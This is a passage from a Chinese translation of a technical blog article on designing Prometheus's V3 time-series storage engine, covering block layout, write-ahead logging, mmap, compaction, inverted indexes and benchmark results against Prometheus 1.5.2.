即便做了分块，每秒也会产生数以千计的数据块并且准备好被持久化。这仍然需要每秒完成几千次单独的磁盘写操作。尽管这一点可以通过为每个序列填满的数据块做分批处理来缓解压力，这反过来又会增加等待被持久化的数据总的内存占用。 保持打开所有文件来读取和写入是不可行的。特别是因为在24小时后超过99%的数据便不再会被查询。如果它还是被查询到的话，我们就不得不打开数千个文件，查找和读取相关的数据点到内存，然后再重新关闭它们。而这样做会导致很高的查询延迟，数据块被相对积极地缓存的话又会导致一些问题，这一点会在“耗用资源”一节里进一步概述。 最终，旧数据必须得被清理掉，而且数据需要从数百万的文件前面被抹除。这意味着删除实际上是写密集型操作。此外，循环地在这数百万的文件里穿梭然后分析它们会让这个过程常常耗费数个小时。在完成时有可能还需要重新开始。呵呵，删除旧文件将会给你的SSD带来进一步的写入放大！ 当前堆积的数据块只能放在内存里。如果应用崩溃的话，数据将会丢失。为了避免这种情况，它会定期地保存内存状态的检查点（Checkpoint）到磁盘，这可能比我们愿意接受的数据丢失窗口要长得多。从检查点恢复估计也会花上几分钟，造成痛苦而漫长的重启周期。 从现有的设计中脱颖而出的关键在于块的概念，我们当然希望保留这一设计。大多数最近的块被保留在内存里一般来说也是一个不错的做法。毕竟，最大幅度被查询数据里大部分便是这些最近的点。 一个时间序列对应一个文件这一概念是我们想要替换的。 序列分流 (Series Churn)在 Prometheus 的上下文里，我们使用术语“序列分流”来描述一组时间序列变得不活跃，即不再接收数据点，取而代之的是有一组新的活跃的序列出现。 举个例子，由一个给定的微服务实例产出的所有序列各自都有一个标识它起源的“instance”标签。如果我们对该微服务完成了一次滚动更新然后将每个实例切换到了一个更新的版本的话，序列分流就产生了。在一个更加动态的环境里，这些事件可能会以小时的频率出现。像Kubernetes这样的集群编排系统允许应用程序不断地自动伸缩和频繁的滚动更新，它可能会创建出数万个新的应用程序实例，并且每天都会使用全新的时间序列。 123456789101112131415series ^ │ . . . . . . │ . . . . . . │ . . . . . . │ . . . . . . . │ . . . . . . . │ . . . . . . . │ . . . . . . │ . . . . . . │ . . . . . │ . . . . . │ . . . . . v &lt;-------------------- time ---------------------&gt; 因此，即便整个基础设施大体上保持不变，随着时间的推移，我们数据库里的时间序列数据量也会呈线性增长。 尽管 Prometheus 服务器很愿意去采集 1000 万个时间序列的数据，但是如果不得不在十亿个序列中查找数据的话，很明显查询性能会受到影响。 当前解决方案Prometheus当前 V2 版本的存储针对当前被存放的所有序列都有一个基于 LevelDB 的索引。它允许包含一个指定的标签对来查询序列，但是缺乏一个可扩展的方式以组合来自不同标签选择的结果。举个例子，用户可以有效地选出带有标签 __name __ =&quot;requests_total&quot; 的所有序列，但是选择所有满足 instance=&quot;A&quot; AND __name __ =&quot;requests_total&quot; 的序列则都有可扩展性的问题。我们稍后会重新审视为什么会造成这样的结果，要改善查询延迟的话要做哪些必要的调整。 实际上这一问题正是触发要实现一个更好的存储系统的最初动力。Prometheus 需要一个改进的索引方法从数亿个时间序列里进行快速搜索。 耗用资源耗用资源是试图扩展 Prometheus（或者任何东西，真的）时不变的话题之一。但是实际上烦恼用户的问题并不是绝对的资源匮乏。实际上，由于给定需求的驱动，Prometheus 管理着令人难以置信的吞吐量。问题更在于是面对变化的相对未知性和不稳定性。由于V2存储本身的架构设计，它会缓慢地构建出大量的样本数据块，而这会导致内存消耗随着时间的推移不断增加。随着数据块被填满，它们会被写入到磁盘，随即便能够从内存中被清理出去。最终，Prometheus 的内存使用量会达到一个稳定的状态。直到受监控的环境发生变化 - 每次我们扩展应用程序或进行滚动更新时，序列分流 会造成内存，CPU 和磁盘 IO 占用方面的增长。 如果变更是正在进行的话，那么最终它将再次达到一个稳定的状态，但是比起一个更加静态的环境而言，它所消耗的资源将会显著提高。过渡期的时长一般长达几个小时，而且很难说最大资源使用量会是多少。 每个时间序列对应一个单个文件的方式使得单个查询很容易就击垮 Prometheus 的进程。而当所要查询的数据没有缓存到内存时，被查询序列的文件会被打开，然后包含相关数据点的数据块会被读取到内存里。倘若数据量超过了可用内存，Prometheus 会因为 OOM 被杀死而退出。待查询完成后，加载的数据可以再次释放，但通常会缓存更长时间，以便在相同数据上更快地提供后续查询。后者显然是一件好事。 最后，我们看下 SSD 上下文里的写入放大，以及 Prometheus 是如何通过批量写入来解决这个问题。然而，这里仍然有几处会造成写入放大，因为存在太多小的批次而且没有精确地对准页面边界。针对更大规模的 Prometheus 服务器，现实世界已经有发现硬件寿命缩短的情况。可能对于具有高写入吞吐量的数据库应用程序来说，这仍属正常，但是我们应该关注是否可以缓解这一情况。 从头开始如今，我们对我们的问题域有了一个清晰的了解，V2 存储是如何解决它的，以及它在设计上存在哪些问题。我们也看到一些很棒的概念设计，这些也是我们想要或多或少无缝适配的。相当数量的 V2 版本存在的问题均可以通过一些改进和部分的重新设计来解决，但为了让事情变得更好玩些（当然，我这个决定是经过深思熟虑的），我决定从头开始编写一款全新的时间序列数据库 —— 从零开始，即，将字节数据写到文件系统。 性能和资源使用这样的关键问题会直接引领我们做出存储格式方面的选择。我们必须为我们的数据找到一个正确的算法和磁盘布局以实现一个性能优良的存储层。 这便是我直接迈向成功时走的捷径 —— 忽略之前经历过的头疼，无数失败的想法，数不尽的草图，眼泪，还有绝望。 V3 - 宏观设计我们新版存储引擎的宏观设计是怎样的？简略来讲，只要到我们的 data 目录下运行 tree 命令，一切便都一目了然。不妨看下这幅美妙的画面它能带给我们怎样的一个惊喜。 12345678910111213141516171819202122232425$ tree ./data./data├── b-000001│ ├── chunks│ │ ├── 000001│ │ ├── 000002│ │ └── 000003│ ├── index│ └── meta.json├── b-000004│ ├── chunks│ │ └── 000001│ ├── index│ └── meta.json├── b-000005│ ├── chunks│ │ └── 000001│ ├── index│ └── meta.json└── b-000006 ├── meta.json └── wal ├── 000001 ├── 000002 └── 000003 在最上面一层，我们有一组带编号的块，它们均有一个前缀 b-。 每个块显然都维护一个包含索引的文件以及一个包含更多编号文件的”chunk”目录。”chunks”目录没别的，就多个序列的一些数据点的原始块。跟V2的做法一样，这样可以用非常低的成本来读取一个时间窗口里的序列数据，并且允许我们采用相同的有效压缩算法。这个概念已经被证实是行之有效的，我们自然就沿用这一点。很显然，这里不再是每个序列对应一个单个文件，取而代之的是，几个文件包含许多序列的数据块。 “index”文件的存在是预料之中的事情。我们不妨假定它包含了大量的黑魔法，允许我们找出标签，它们可能的值，整个时间序列，以及存放数据点的数据块。 但是，为什么有几个目录是一个索引和一些块文件这样的布局？为什么最后一个目录里取而代之的是有一个“wal”目录？搞清楚这两个问题的话可以解决我们90％的问题。 众多的小型数据库我们将我们的水平维度，即时间空间分割成非重叠的块。 每个块当成一个完全独立的数据库，包含其时间窗口的所有时间序列数据。因此，它有自己的索引和一组块文件。 12345678910t0 t1 t2 t3 now ┌───────────┐ ┌───────────┐ ┌───────────┐ ┌───────────┐ │ │ │ │ │ │ │ │ ┌────────────┐ │ │ │ │ │ │ │ mutable │ &lt;─── write ──── ┤ Prometheus │ │ │ │ │ │ │ │ │ └────────────┘ └───────────┘ └───────────┘ └───────────┘ └───────────┘ ^ └──────────────┴───────┬──────┴──────────────┘ │ │ query │ │ merge ─────────────────────────────────────────────────┘ 每个块的数据均是无法更改的。当然，在我们采集到新数据时我们必须能够将新序列和样本数据添加到最近的数据块里。对于这个数据块，所有新数据都将写入到内存数据库里，跟我们持久化的数据块一样，它也会提供相同的查找属性。内存里的数据结构也可以被有效地更新。为了防止数据丢失，所有传入的数据还会被写入预写日志（write ahead log），即我们的“wal”目录中的一组文件，我们可以在重新启动时基于这些文件将之前内存里的数据重新填充到内存数据库。 所有这些文件都带有自己的序列化格式，它附带了许多标志，偏移量，变体和 CRC32 校验和。比起无聊地读着介绍，读者朋友自己去发现它们也许会更有乐趣些。 这种布局允许我们查出所有和被查询的时间范围相关的数据块。每个块的部分结果被合并到一起形成最终的完整结果。 这种水平分区解锁了一些很棒的功能： 当查询一个时间范围时，我们可以轻松地忽略该范围外的所有数据块。 通过减少一系列开始时需要检查的数据，它可以初步解决序列分流的问题。 当完成一个数据块的填充时，我们可以通过顺序写入数据到一些较大的文件来保存内存数据库中的数据。 这样就避免了任何写入放大的问题，并且同样适用于SSD和HDD。 我们继承了 V2 优秀的地方，最近最多被查询的数据块总是作为热点保存在内存里。 棒棒哒，我们再也不需要通过固定的1KiB块大小设定来更好地对齐磁盘上的数据。 我们可以选择任何对于个别数据点和选定的压缩格式最有意义的大小。 删除旧数据变得非常低成本和及时。我们只需要删除一个目录。 请记住，在旧存储中，我们不得不分析并重新编写高达数亿个文件，这一操作可能需要几个小时才能收敛。 每个块还包含一个 meta.json 文件。 它简单地保存该数据块的人类可读信息，便于用户轻松了解数据块的存储状态及其包含的数据。 mmap从数以百万的小文件改成几个更大的文件使得我们能够以很小的成本保持所有文件的打开句柄。这也解锁了使用 mmap(2) 的玩法，它是一个系统调用，允许我们通过文件内容透明地回传到一个虚拟内存区域。为了简单起见，你可以联想它类似于交换(swap)空间，只是我们所有的数据已经在磁盘上，并且在将数据交换出内存后不会发生写入。这意味着我们可以将数据库里的所有内容均视为内存而不占用任何物理RAM。只有我们访问我们的数据库文件中的某些字节范围时，操作系统才会从磁盘惰性地加载页面。这就把和我们持久化数据相关的所有内存管理都交给了操作系统负责。 一般来说，操作系统更有资格做出这样的决定，因为它对整个机器及其所有过程有更全面的看法。查询数据可以相当积极地被缓存在内存里，而一旦面临内存压力，页面便会被逐出(evicted)。如果机器有未使用的内存，Prometheus 将会很高兴去缓存整个数据库，而一旦另一个应用程序需要它，它将立即返回。 这样一来，比起受到 RAM 的大小限制，即便查询更多的持久化数据，查询操作也不会再轻易造成进程的 OOM。内存的缓存大小变得完全自适应，只有在查询实际需要的数据时才会加载数据。 就我个人的理解，这是今天的很多数据库的工作方式，如果磁盘格式允许的话，这是一个理想的方法 - 除非你有信心在进程里做的工作能够超越操作系统。我们自己做了很少一部分工作而确实从外部系统收获了大量功能。 压缩 (compaction)存储引擎必须定期地“切出”一个新的块，并将之前完成的块写入到磁盘。只有块被成功持久化后，用于恢复内存块的预写日志文件（wal）才会被删除。 我们有兴趣将每个块的保存时间设置的相对短一些（一般设置大约两个小时），以避免在内存中堆积太多的数据。当查询多个块时，我们必须将其结果合并为一个完整结果。 这个合并过程显然会有一个成本，一个一周长的查询不应该需要合并超过80个的部分结果。 为了实现两者共同的需求，我们引入数据压缩（compaction）。它描述了采集一个或多个数据块并将其写入一个可能会更大的块的过程。它还可以沿途修改现有的数据，例如，清理已删除的数据，或重组我们的样本数据块以提高查询性能。 12345678910t0 t1 t2 t3 t4 now ┌────────────┐ ┌──────────┐ ┌───────────┐ ┌───────────┐ ┌───────────┐ │ 1 │ │ 2 │ │ 3 │ │ 4 │ │ 5 mutable │ before └────────────┘ └──────────┘ └───────────┘ └───────────┘ └───────────┘ ┌─────────────────────────────────────────┐ ┌───────────┐ ┌───────────┐ │ 1 compacted │ │ 4 │ │ 5 mutable │ after (option A) └─────────────────────────────────────────┘ └───────────┘ └───────────┘ ┌──────────────────────────┐ ┌──────────────────────────┐ ┌───────────┐ │ 1 compacted │ │ 3 compacted │ │ 5 mutable │ after (option B) └──────────────────────────┘ └──────────────────────────┘ └───────────┘ 在这个例子里，我们有一组顺序的块 [1, 2, 3, 4]。数据块 1, 2 和 3 可以被一起压缩，然后形成的新结构便是 [1, 4]。或者，将它们成对地压缩成 [1，3]。 所有的时间序列数据仍然存在，但是现在总体的数据块更少。 这显著降低了查询时的合并成本，因为现在需要被合并的部分查询结果会更少。 保留 (Retention)我们看到，删除旧数据在 V2 存储引擎里是一个缓慢的过程，而且会消耗 CPU，内存和磁盘。那么，我们该如何在基于块的设计中删除旧数据呢？简单来讲，只需删除该目录下在我们配置的保留窗口里没有数据的块。 在下面的示例中，块1可以安全地被删除，而2必须保留到完全落在边界之后才行。 1234567 |┌────────────┐ ┌────┼─────┐ ┌───────────┐ ┌───────────┐ ┌───────────┐│ 1 │ │ 2 | │ │ 3 │ │ 4 │ │ 5 │ . . .└────────────┘ └────┼─────┘ └───────────┘ └───────────┘ └───────────┘ | | retention boundary 获取越旧的数据，数据块可能就变得越大，这是因为我们会不断地压缩以前压缩的块。 因此必须得有一个压缩的上限，这样一来块就不会扩展到跨越整个数据库从而影响到我们设计的最初优势。 另一个方便之处在于，这样也可以限制部分在保留窗口里部分在外面的数据块的总磁盘开销，即上面示例中的块 2.当用户将最大块的大小设置为总保留窗口的 10% 时，保留块 2 的总开销也有 10% 的上限。 总而言之，保留删除的实现从非常高的成本变成了几乎零成本。 如果看到这里，而且读者朋友本人有一些数据库的背景的话，你可能会问一件事：这是一个新玩法吗？ —— 其实不是；而且大概还可以做得更好。 在内存里批量处理数据，在预写日志（wal）里跟踪，并定期刷新到磁盘，这种模式在今天是被广泛采纳的。 无论数据特指的问题域是什么，我们所看到的好处几乎都是普遍适用的。 遵循这一方法的突出开源案例是 LevelDB，Cassandra，InfluxDB 或 HBase。而这里面的关键是要避免重复发明劣质轮子，研究经过生产验证的方法，并采取正确的姿势应用它们。 这里仍然留有余地可以添加用户自己的黑科技。 索引 (index)调研存储的改进方案的源动力便是为了解决序列分流引发的问题。基于块的布局设计减少了为查询提供服务所涉及的时间序列的总数。因此，假设我们索引查找的时间复杂度是 O（n ^ 2），我们设法减少n个相等的数量，那么现在就有一个改进的复杂度 O（n ^ 2） - uhm，等一下… 哇靠。 这时候脑海里迅速回忆起“算法101”提醒我们的事情，理论上讲，这并没有给我们带来任何改善。 如果以前做的不好，那现在也差不多。理论有时候真的挺让人沮丧的。 通过实践，我们大部分的查询明显会被更快地应答。然而，跨越全部时间范围的查询仍然很慢，即便他们只需要找到少量的系列。在所有这些工作开始之前，我最初的想法都是想要一个切实解决这个问题的方案：我们需要一个更强大的倒排索引。 倒排索引基于它们内容的子集提供对数据项的快速查找。简单来讲，用户可以找出所有带有标签“app =”nginx“的序列，而无需遍历每一个序列然后再检查它是否包含该标签。 为此，每个序列被分配一个唯一的 ID，通过它可以在恒定的时间内检索，即 O（1）。在这种情况下，ID 就是我们的正向索引。 示例：如果ID为10,29和9的序列包含标签 app=&quot;nginx&quot;，标签 “nginx” 的倒排索引便是一个简单的列表 [10,29,9]，它可以用来快速检索包含该标签的所有序列。即便还有 200 亿个序列，这也不会影响该次查找的速度。 简而言之，如果n是我们的序列总数，m 是给定查询的结果大小，那么使用索引的查询复杂度便是 O（m）。查询操作扩展到根据其检索的数据量（m）而不是正在搜索的数据体（n）是一个很棒的特性，因为一般来说 m 明显会更小些。 为了简单起见，我们假定可以在恒定的时间内完成倒排索引列表本身的检索。 实际上，这也几乎就是V2版本所拥有的倒排索引的类型，也是为数百万序列提供高性能查询的最低要求。敏锐的观察者会注意到，在最坏的情况下，所有的系列都存在一个标签，因此，m又是O（n）。 这是预料中的事情，而且也完全合理。 如果用户要查询所有的数据，自然就需要更长的时间。 一旦涉及到更复杂的查询这里可能就有问题了。 组合标签 (Combining Labels)标签被关联到数百万序列是很常见的。 假设有一个拥有数百个实例的横向可扩缩的“foo”微服务，每个实例有数千个系列。 每个系列都会有“app =”foo“的标签。当然，用户一般不会去查询所有的系列，而是通过进一步的过滤标签来限制查询，例如，我想知道我的服务实例收到多少个请求，那查询语句便是 __name __ =“requests_total” AND app =“foo”。 为了找出满足两个标签选择器的所有系列，我们取每个标签选择器的倒排索引列表然后取交集。 所得到的集合通常比每个输入列表小一个数量级。由于每个输入列表具有最差情况的复杂度是O（n），所以在两个列表上嵌套迭代的暴力解都具有O（n ^ 2）的运行时间。 其他集合操作也是相同的成本，例如union（app =“foo”OR app =“bar”）。当用户向查询添加进一步的标签选择器时，指数会增加到O（n ^ 3），O（n ^ 4），O（n ^ 5），… O（n ^ k）。 通过更改执行顺序，可以玩很多技巧来最大限度地有效减少运行时间。越复杂，就越需要了解数据样式和标签之间的关系。这引入了更多复杂度，但是并没有减少我们算法的最坏运行时间。 以上基本便是V2存储里采取的方式，幸运的是，看似微不足道的修改足以获得显著的提升。如果我们说我们的倒排索引中ID是排序好的话会发生什么？ 假设我们初始查询的列表示例如下： 1234__name__=&quot;requests_total&quot; -&gt; [ 9999, 1000, 1001, 2000000, 2000001, 2000002, 2000003 ] app=&quot;foo&quot; -&gt; [ 1, 3, 10, 11, 12, 100, 311, 320, 1000, 1001, 10002 ] intersection =&gt; [ 1000, 1001 ] 它们的交集相当小。我们可以通过在每个列表的开始处设置一个光标，并且始终从较小的数字那端依次推进。 当两个数字相等时，我们将数字添加到我们的结果中并推进两个游标。总的来说，我们以这种之字形模式（zig-zag pattern）扫描这两个列表，这样一来我们总的成本会是O（2n）= O（n），因为我们只是在任意一个列表中向前移动。 两个以上列表的不同集合操作的过程也是类似的效果。因此，k个集合操作的数量仅仅只会将时间复杂度修改为（O（k * n））而不是我们最坏情况的查找运行时的指数级（O（n ^ k））。真是一个大进步。 我在这里描述的内容几乎就是任意一款全文搜索引擎 所使用的规范搜索索引的简化版本。每个序列的描述符被视为一个简短的“文档”，每个标签（名称+固定值）作为其中的“单词”。我们可以忽略通常在搜索引擎索引中遇到的大量附加数据，例如字位置和出现频率等数据。 业内似乎都在无休止的研究探索改进实际运行时的方法，他们也常常对输入数据做出一些假设。不出所料的是，许多可以压缩倒排索引的技术均是有利有弊的。而由于我们的“文档”很小，“文字”在所有序列里都是非常重复的，所以压缩变得几乎无关紧要。 例如，一个约440万系列的现实世界数据集，每个标签约有12个，拥有少于5,000个唯一的标签。在我们最开始的存储版本里，我们坚持使用基本方法而不进行压缩，只添加了一些简单的调整来跳过大范围的非相交ID。 维持排序好的ID听上去可能很简单，但是实际坚持下来却是不太容易办到的。比如，V2存储引擎将一个哈希值作为ID赋给新的序列，我们无法有效地基于此建立一个排序好的倒排索引。另一个艰巨的任务是在数据被删除或更新时修改磁盘上的索引。通常，最简单的方法是简单地重新计算和重写它们，但是得在保证数据库可查询和一致性的同时执行这一操作。V3版本的存储引擎通过在每个块中分配一个单独的不可变索引来彻底解决这一问题，只能通过压缩时的重写来进行修改。而且，只有整个保存在内存里的可变块的索引才需要被更新。 基准测试 (Benchmark)我发起了一个最初开发版本V3存储的基准测试，它是基于从现实世界数据集中提取的大约440万个序列描述符，并生成合成的数据点到对应的序列。这种遍历测试了单独的存储模块，而且对于快速识别性能瓶颈和触发仅在高并发负载下才会遇到的死锁尤为重要。 在完成概念性的实施之后，基准测试可以在我的Macbook Pro上保持每秒2000万个数据点的写吞吐量 —— 而所有的Chrome Tab和Slack都在持续运行。所以尽管这听上去很棒，但也表明推动这一基准测试没有进一步的价值（或者在这个问题里的随机环境下运行是这样的）。毕竟，这是合成的，这就决定了第一印象不会太好。对比最初的设计目标放大到近20倍的数据量，那么是时候将它嵌入到真正的Prometheus服务器里了，我们可以在上面添加所有只会在更贴近现实的环境里才会遇到的一切实际开销和情景。 实际上，我们没有可重复的Prometheus基准测试配置，特别是没有允许不同版本的A / B测试。 亡羊补牢为时不晚，现在我们有一个了！ 我们的工具允许我们声明式地定义一个基准测试场景，然后将其部署到AWS上的Kubernetes集群。 虽然这不是全面的基准测试的最佳环境，但它肯定能反映出我们的用户基本上会比64内核和128GB内存的专用裸机服务器跑的更好。我们部署了两台Prometheus 1.5.2的服务器（V2存储引擎）以及两台基于2.0开发分支（V3存储引擎）部署的两台Prometheus服务器。每台Prometheus服务都是运行在一台配备有一块SSD的专用服务器上。我们将一个横向可扩展的应用程序部署到了工作节点上并让它对外暴露典型的微服务度量。此外，Kubernetes集群和节点本身也正在被监控。全部配置均由另一个Meta-Prometheus监督，它会监控每台Prometheus服务器的健康性和性能。为了模拟序列分流，微服务会定期地向上扩容和向下缩容，以去除旧的pod，并产生新的pod，从而生成新的序列。 查询负载以“典型”地选择查询来模拟，对每个Prometheus版本的一台服务器执行操作。 总体而言，缩放和查询负载以及采样频率显著超过了今天Prometheus的生产部署。 例如，我们每15分钟换掉60％的微服务实例以产生序列分流。在现代化的基础设施中这应该每天只会发生1-5次。 这样就能确保我们的V3设计能够处理未来几年的工作负载。 因此，比起一个更为温和的环境，在现在这样的情况下，Prometheus 1.5.2和2.0之间的性能差异更大。我们每秒总共从850个同一时间暴露50万个序列的目标里收集大约11万个样本。 在放任这一配置运行一段时间后，我们可以来看些数字。我们评估一下前12个小时内两个版本均达到稳定状态的几个指标。 请注意在Prometheus图形界面上的屏幕截图中略微截断的Y轴。 堆内存使用（GB） 内存使用是当今用户最为困扰的资源问题，因为它是相对无法预测的，而且可能会导致进程崩溃。显然，被查询的服务器正在消耗更多的内存，这主要得归咎于查询引擎的开销，而这一点在未来将有望得到优化。总的来说，Prometheus 2.0的内存消耗减少了3-4倍。 大约六个小时后，Prometheus 1.5版本就有一个明显的尖峰，与六个小时的保留边界一致。 由于删除操作成本很高，资源消耗也随之增加。这将在下面的各种其他图表中体现。 CPU使用率，核心/秒 CPU使用率的展示也是类似的模式，但是这里面查询服务器与非查询服务器之间的增量差异更为明显。以约0.5个核心/秒的平均值摄取大约110,000个样本/秒，与查询计算所花费的时间周期相比，我们的新存储消耗成本几乎可以忽略不计。 总的来说，新存储需要的CPU资源减少了3-10倍。 磁盘写入MB/秒 我们磁盘的写入利用率方面展示出了最突出和意想不到的改进。 这清晰地表明了为什么Prometheus 1.5容易造成SSD的耗损。 一旦第一个块被持久化到序列文件里，我们就能看到最开始会有一个飙升的过程，一旦删除然后开始重写，就会出现第二次飙升。令人诧异的是，被查询和非查询的服务器显示出完全不同的资源消耗。 另一方面，Prometheus 2.0只是以大约每秒一兆字节的写入速度写入到wal文件。 当块被压缩到磁盘时，写入周期性地出现一个尖峰。 这总体上节省了：惊人的97-99％。 磁盘大小（GB） 与磁盘写入量密切相关的是磁盘空间的总占用量。 由于我们对样本，即我们数据中的大部分组成，使用几乎相同的压缩算法，因此它们也应该是大致相同的。 在一个更稳定的环境中，这样做在很大程度上是合理的，但是因为我们要处理的是高度的序列分流，我们还得考虑每个序列的开销。 可以看到，Prometheus 1.5在两个版本都抵达稳定状态之前，消耗的存储空间因为保留策略的执行而迅速飙升。而Prometheus 2.0似乎在每个序列的开销都有一个明显的降幅。我们可以很高兴地看到磁盘空间是由预写日志文件线性填充的，并随着其压缩会瞬间下降。 事实上，Prometheus 2.0服务器不完全匹配线性增长的情况也是需要进一步调查的。 一切看上去都是充满希望的。 剩下的重要部分便是查询延迟。 新的索引应该提高了我们的查找复杂度。 没有实质改变的是这些数据的处理，例如 rate（）函数或聚合。 这些是查询引擎的一部分。 99百分位数查询延迟（以秒为单位） 数据完全符合预期。 在Prometheus 1.5中，随着存储更多的序列，查询延迟会随时间而增加。 一旦保留策略开始执行，旧的系列被删除，它才会平息。 相比之下，Prometheus 2.0从一开始就停留在合理的位置。 这个数据怎样被收集则需要用户花些心思。对服务器发出的查询请求取决于一个时间范围值和即时查询估计的最佳搭档，压缩或轻或重，以及涉及的序列或多或少等等。它不一定代表查询的真实分布。它也不能代表冷数据的查询性能，我们可以假设所有样本数据实际上总是存储在内存中的热点数据。 尽管如此，我们仍然可以非常有信心地说，新版存储引擎在序列分流方面整体查询的性能变得非常有弹性，并且在我们高压的基准场景中存储的性能提高了4倍。在一个更加静态的环境里，我们可以假定查询时间主要用于查询引擎本身，而且延迟明显可以被改进到更低值。 采样/秒 最后，快速过一下我们对不同Prometheus服务器的采样率。 我们可以看到，配备V3存储的两台服务器是相同的采样率。几个小时后，它变得不稳定，这是由于基准集群的各个节点高负载造成的失去响应而跟Prometheus实例本身无关。 （这两行2.0的数据完全匹配的事实希望能让人信服） 即便还有更多可用的CPU和内存资源，Prometheus 1.5.2服务器的采样速率也在大大降低。 序列分流的高压导致它无法收集更大量的数据。 那么，现在每秒可以抓取的绝对最大样本数是多少？ 我不知道 - 而且也故意不关注这一点。 影响Prometheus数据流量的因素众多，而这里面没有哪个单个数字能够衡量捕获质量。最大采样率历来是导致基准偏倚的一个指标，它忽略了更重要的方面，如查询性能以及对序列分流的抵御能力。 一些基本测试证实了资源使用线性增长的粗略假设。而这很容易推断出存在什么可能的结果。 我们的基准测试设置模拟了一个高度动态的环境，它给Prometheus施加的压力比今天大多数现实世界的设定要更大。 结果表明，我们在最优设计目标的基础上运行，而在不是最棒的云服务器上跑着。当然，最终衡量是否成功还是得取决于用户的反馈而不是基准数字。 注意：在撰写本文时，Prometheus 1.6正在开发中，它将允许更可靠地配置最大内存使用量，并且可能会显著降低总体的消耗，略微有利于提高CPU利用率。我并没有进行重复的测试，因为整体的结果仍然变化不大，特别是当面对高度的序列分流时更是如此。 结论Prometheus开始准备应对独立样本的高基数序列及吞吐的处理。 这仍然是一项很具有挑战的任务，但是新的存储引擎似乎使得我们对于超大规模，超收敛的GIFEE基础设施的未来感到满意。恩，它似乎跑的不错。 配备新版V3存储引擎的第一个Alpha版本的 Prometheus 2.0 已经可用于测试。在这个早期阶段，预计会发生崩溃，死锁和其他错误。 存储引擎本身的代码可以在单独的项目中找到。对于Prometheus本身而言，这是非常不可知论的，而且它也可以广泛用于一大波正在苦苦寻觅一个有效的本地时间序列数据库存储的应用。 这里得感谢很多人对这项工作的贡献。以下名单不分前后： Bojoern Rabenstein和Julius Volz在V2存储引擎上的打磨工作以及他们对于V3的反馈为这新一代设计里所能看到的一切事物奠定了基础。 Wilhelm Bierbaum持续不断地意见和见解为新一代的设计做出了重大贡献。Brian Brazil源源不断的反馈也确保我们最终采用语义上合理的方案。与Peter Bourgon的精辟讨论验证了新的设计，并且造就了这篇文章。 当然也别忘了我所在的CoreOS整个团队和公司本身对这项工作的支持和赞助。感谢那些能够耐心听我一次又一次地扯着SSD，浮点数和序列化格式的每一位同学。 原文链接：writing-a-time-series-database-from-scratch译文链接：从头编写一款时间序列数据库 （翻译：Colstuwjx）","link":"/hexo-blog/20180110/从头编写一款时间序列数据库/"}],"tags":[{"name":"原创","slug":"原创","link":"/hexo-blog/tags/原创/"},{"name":"图像处理","slug":"图像处理","link":"/hexo-blog/tags/图像处理/"},{"name":"算法","slug":"算法","link":"/hexo-blog/tags/算法/"},{"name":"蚁群算法","slug":"蚁群算法","link":"/hexo-blog/tags/蚁群算法/"},{"name":"爬虫","slug":"爬虫","link":"/hexo-blog/tags/爬虫/"},{"name":"Python","slug":"Python","link":"/hexo-blog/tags/Python/"},{"name":"Linux","slug":"Linux","link":"/hexo-blog/tags/Linux/"},{"name":"Fedora","slug":"Fedora","link":"/hexo-blog/tags/Fedora/"},{"name":"操作系统","slug":"操作系统","link":"/hexo-blog/tags/操作系统/"},{"name":"运维","slug":"运维","link":"/hexo-blog/tags/运维/"},{"name":"黑客技术","slug":"黑客技术","link":"/hexo-blog/tags/黑客技术/"},{"name":"转载","slug":"转载","link":"/hexo-blog/tags/转载/"},{"name":"网络","slug":"网络","link":"/hexo-blog/tags/网络/"},{"name":"主板","slug":"主板","link":"/hexo-blog/tags/主板/"},{"name":"维修","slug":"维修","link":"/hexo-blog/tags/维修/"},{"name":"硬件","slug":"硬件","link":"/hexo-blog/tags/硬件/"},{"name":"多线程","slug":"多线程","link":"/hexo-blog/tags/多线程/"},{"name":"连连看","slug":"连连看","link":"/hexo-blog/tags/连连看/"},{"name":"游戏","slug":"游戏","link":"/hexo-blog/tags/游戏/"},{"name":"Kubernetes","slug":"Kubernetes","link":"/hexo-blog/tags/Kubernetes/"},{"name":"K8S","slug":"K8S","link":"/hexo-blog/tags/K8S/"},{"name":"云计算","slug":"云计算","link":"/hexo-blog/tags/云计算/"},{"name":"HTC","slug":"HTC","link":"/hexo-blog/tags/HTC/"},{"name":"刷机","slug":"刷机","link":"/hexo-blog/tags/刷机/"},{"name":"Android","slug":"Android","link":"/hexo-blog/tags/Android/"},{"name":"安卓","slug":"安卓","link":"/hexo-blog/tags/安卓/"},{"name":"etcd","slug":"etcd","link":"/hexo-blog/tags/etcd/"},{"name":"terraform","slug":"terraform","link":"/hexo-blog/tags/terraform/"},{"name":"Golang","slug":"Golang","link":"/hexo-blog/tags/Golang/"},{"name":"Openstack","slug":"Openstack","link":"/hexo-blog/tags/Openstack/"},{"name":"Prometheus","slug":"Prometheus","link":"/hexo-blog/tags/Prometheus/"}],"categories":[]}